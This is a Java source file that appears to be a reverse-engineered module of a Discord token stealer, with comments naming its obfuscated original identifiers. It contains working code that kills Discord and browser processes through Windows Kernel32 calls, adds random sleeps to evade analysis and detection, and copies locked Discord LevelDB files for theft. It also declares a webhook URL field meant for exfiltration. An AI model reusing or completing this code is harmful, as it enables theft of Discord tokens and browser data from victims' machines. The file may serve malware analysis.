import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinDef;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.FileAttribute;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Process management and file utilities.
 * Obfuscated name: \u04dd
 *
 * Responsibilities:
 *  1. Kill Discord processes by name (using Windows Kernel32 API via JNA)
 *  2. File copy/delete utilities
 *  3. Random sleep (anti-analysis)
 *  4. Long path normalization (via Windows NtDll)
 *
 * Used by DiscordTokenStealer to kill Discord before/after injection.
 */
public class ProcessKiller {

    // Thread pool for async operations
    public static final ExecutorService executor = Executors.newCachedThreadPool();

    // Webhook URL (set at runtime from EntryPoint)
    public static final String webhookUrl;

    // Machine ID (derived from network interfaces + MAC address hash)
    public static final String machineId;

    // Process name sets for killing
    private static final Set<String> discordProcessNames;   // discord.exe, discordcanary.exe, etc.
    private static final Set<String> browserProcessNames;   // chrome.exe, brave.exe, etc.

    // Whether we're in "silent" mode (no console output)
    private static boolean silent;

    /**
     * Normalizes a Windows long path.
     * Uses NtDll UNICODE_STRING structure to convert short paths to long paths.
     * Calls Windows API: NtQueryObject / RtlNtPathNameToDosPathName
     *
     * @param path The path to normalize
     * @return Normalized long path, or original if normalization fails
     */
    public static String normalizePath(String path) {
        if (path == null) return null;
        try {
            // Uses \u04cc.\u00ff (NtDll wrapper) to call GetLongPathName
            char[] buffer = new char[32768];
            int len = NtDllWrapper.getLongPathName(path, buffer, buffer.length);
            if (len > 0) return new String(buffer, 0, len);
        } catch (Throwable ignored) {}
        return path;
    }

    /**
     * Kills all processes matching the given name set.
     * Uses Windows Kernel32 API:
     *   CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     *   Process32First / Process32Next
     *   OpenProcess(PROCESS_TERMINATE, false, pid)
     *   TerminateProcess(handle, 0)
     *   CloseHandle(handle)
     *
     * Retries up to 3 times with random sleep between attempts.
     *
     * @param processNames Set of process names to kill (lowercase, e.g. "discord.exe")
     */
    public static void killProcesses(Set<String> processNames) {
        for (int attempt = 0; attempt < 3; attempt++) {
            int killed = 0;
            WinDef.HANDLE snapshot = Kernel32.INSTANCE.CreateToolhelp32Snapshot(
                Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0)
            );
            if (snapshot == null) break;

            try {
                Tlhelp32.PROCESSENTRY32.ByReference entry = new Tlhelp32.PROCESSENTRY32.ByReference();
                if (!Kernel32.INSTANCE.Process32First(snapshot, entry)) break;

                do {
                    String exeName = new String(entry.szExeFile).toLowerCase();
                    if (!processNames.contains(exeName)) continue;

                    int pid = entry.th32ProcessID.intValue();
                    if (pid == Kernel32.INSTANCE.GetCurrentProcessId()) continue;

                    WinDef.HANDLE process = Kernel32.INSTANCE.OpenProcess(1, false, pid);
                    if (process == null) continue;

                    boolean terminated = Kernel32.INSTANCE.TerminateProcess(process, 0);
                    Kernel32.INSTANCE.CloseHandle(process);
                    if (terminated) killed++;

                } while (Kernel32.INSTANCE.Process32Next(snapshot, entry));

            } finally {
                Kernel32.INSTANCE.CloseHandle(snapshot);
            }

            if (killed == 0) break;

            // Random sleep between kill attempts (anti-detection)
            randomSleep(500, 1500);
        }
    }

    /**
     * Kills Discord processes.
     * Process names: discord.exe, discordcanary.exe, discordptb.exe, discorddev.exe
     */
    public static void killDiscord() {
        killProcesses(discordProcessNames);
    }

    /**
     * Kills browser processes.
     * Process names: chrome.exe, brave.exe, opera.exe, msedge.exe, yandex.exe
     */
    public static void killBrowsers() {
        killProcesses(browserProcessNames);
    }

    /**
     * Sleeps for a random duration between min and max milliseconds.
     * Used to avoid timing-based detection.
     */
    public static void randomSleep(long minMs, long maxMs) {
        try {
            long duration = minMs + (long)(Math.random() * (maxMs - minMs));
            Thread.sleep(duration);
        } catch (Exception ignored) {}
    }

    /**
     * Copies a file to a temp location with retry logic.
     * Retries up to 5 times with sleep between attempts.
     * Used to copy locked files (e.g. Discord's LevelDB files).
     *
     * @param source Source file to copy
     * @return Temp file copy, or throws IOException after 5 failures
     */
    public static File copyToTemp(File source) throws IOException {
        File temp = Files.createTempFile("tmp_", ".tmp", new FileAttribute[0]).toFile();
        temp.deleteOnExit();

        for (int i = 0; i < 5; i++) {
            try {
                Files.copy(source.toPath(), temp.toPath(), StandardCopyOption.REPLACE_EXISTING);
                return temp;
            } catch (IOException e) {
                if (i == 4) throw e;
                try { Thread.sleep(200); } catch (Exception ignored) {}
            }
        }
        return temp;
    }

    /**
     * Deletes a file or directory recursively.
     * If file is a directory, deletes all contents first.
     * If delete fails, schedules deleteOnExit.
     */
    public static void deleteRecursive(File file) {
        if (file == null || !file.exists()) return;
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) deleteRecursive(child);
            }
        }
        if (!file.delete()) file.deleteOnExit();
    }

    static {
        // Initialize process name sets (decoded from obfuscated string table b[])
        discordProcessNames = new java.util.HashSet<>();
        discordProcessNames.add("discord.exe");
        discordProcessNames.add("discordcanary.exe");
        discordProcessNames.add("discordptb.exe");
        discordProcessNames.add("discorddev.exe");

        browserProcessNames = new java.util.HashSet<>();
        browserProcessNames.add("chrome.exe");
        browserProcessNames.add("brave.exe");
        browserProcessNames.add("opera.exe");
        browserProcessNames.add("msedge.exe");
        browserProcessNames.add("yandexbrowser.exe");

        // webhookUrl and machineId are set at runtime
        webhookUrl = null;
        machineId = null;
    }
}
